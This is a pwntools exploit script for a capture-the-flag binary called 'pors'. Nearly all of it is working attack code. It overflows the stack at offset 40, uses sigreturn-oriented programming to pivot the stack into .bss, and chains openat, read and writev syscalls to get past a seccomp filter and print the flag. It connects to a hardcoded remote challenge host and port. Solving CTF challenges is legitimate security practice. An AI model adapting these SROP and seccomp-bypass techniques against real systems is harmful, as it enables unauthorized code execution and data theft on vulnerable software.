#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pors'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '193.148.168.30', 7668

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x401337
break *0x0401341
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ seccomp-tools dump ./pors 
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0011
#  0006: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0011
#  0007: 0x15 0x03 0x00 0x00000009  if (A == mmap) goto 0011
#  0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011
#  0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL
# └──╼ [★]$ pwn checksec pors 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

POP_RDI = 0x04012ec
RET = 0x040101a
FLAGPATH = b'/home/halcyon/git/CTFs/2024/L3ak/pors/flag.txt\x00'
# FLAGPATH = b'/app/flag.txt\x00'
FRAME_SIZE = 248 # just len(frame)

def exploit():
    global io
    io = initialize()

    # somehow the plt syscall ABI is a bit weird,
    # the convention would be:
    # 1st arg => RSI
    # 2nd arg => RDX
    # 3rd arg => RCX
    # 4th arg => r10 
    sigret = flat(
        POP_RDI,
        15,
        elf.plt['syscall']
    )
    
    # ============================
    # PIVOT STACK TO .BSS
    # ============================
    offset = 40
    payload = flat({
        offset: [
            sigret
        ]
    })

    read_frame = SigreturnFrame()
    read_frame.rdi = 0x0    # read 
    read_frame.rsi = 0x0    # stdin
    read_frame.rdx = elf.bss() + 0x400 + FRAME_SIZE + len(payload)  # buf
    read_frame.rcx = 0x1000  # count
    read_frame.rsp = elf.bss() + 0x400 + FRAME_SIZE + len(payload)
    read_frame.rip = elf.sym['syscall']
    payload += bytes(read_frame)
    log.info("sending 1st stage payload")
    io.send(payload)

    # ============================
    # ORW FLAG
    # ============================
    # start of our payload, will be used to adjust RSP as we sigreturn
    # since after plf syscall, it will pop rip from rsp
    offset = elf.bss() + 0x400 + (FRAME_SIZE + len(sigret)) * 2 + 0x28 

    open_frame = SigreturnFrame()
    open_frame.rdi = 257    # openat
    open_frame.rsi = 0x0    # dfd
    open_frame.rdx = offset # buf
    open_frame.rcx = 0x0    # flags
    open_frame.r10 = 0x0    # mode
    open_frame.rsp = offset + len(FLAGPATH)
    open_frame.rip = elf.sym['syscall']
    offset += len(FLAGPATH)

    read_frame.rsi = 0x3                # flag fd
    read_frame.rdx = elf.bss() + 0x100  # buf
    read_frame.rcx = 0x40               # count
    read_frame.rsp = offset + FRAME_SIZE + len(sigret)
    offset += FRAME_SIZE + len(sigret)

    pwrite_frame = SigreturnFrame()
    pwrite_frame.rdi = 20                                   # writev
    pwrite_frame.rsi = 0x1                                  # stdout
    pwrite_frame.rdx = offset + FRAME_SIZE + len(sigret)    # iovec *
    pwrite_frame.rcx = 0x1                                  # vlen
    pwrite_frame.rsp = elf.bss() + 0x60                     # writeable
    pwrite_frame.rip = elf.sym['syscall']
    offset += FRAME_SIZE + len(sigret)

    payload = sigret + bytes(open_frame) + FLAGPATH + sigret + bytes(read_frame) + sigret + bytes(pwrite_frame)
    payload += p64(elf.bss() + 0x100) + p64(0x40) # struct iovec

    sleep(3)
    log.info("sending 2nd stage payload")
    io.send(payload)

    io.interactive()
    
if __name__ == '__main__':

    exploit()